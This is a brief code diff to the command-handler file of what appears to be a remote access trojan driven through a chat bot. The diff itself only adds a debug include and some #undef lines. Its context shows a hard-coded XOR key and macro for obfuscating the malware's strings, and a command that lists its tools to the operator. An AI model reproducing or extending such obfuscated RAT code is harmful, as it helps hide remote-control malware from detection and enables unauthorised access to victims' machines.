@@ -2,6 +2,8 @@
 #include "rat/encryption/xor.hpp"
 #include <array>
 
+#include "rat/handler/debug.hpp"
+
 #define XOR_KEY "ksdjkgjfsdajghfjdahgajkfdhgjakfdhgjkafhdjkfadhgjfadhgjx.[as;;qw;;rfhadfgjhafgjkdhgjkfda"
 #define XOR_STRING(str) rat::encryption::xorEncrypt(str, XOR_KEY)
 
@@ -54,4 +56,9 @@ void Handler::handleHelpCommand() {
 void Handler::handleMenuCommand() {
     this->bot->sendMessage(this->state.listDynamicTools());
 }
-} // namespace rat::handler
+} // namespace rat::Handler
+#undef DEBUG_LOG
+#undef ERROR_LOG
+#ifdef DEBUG_RAT_HANDLER
+    #undef DEBUG_RAT_HANDLER
+#endif
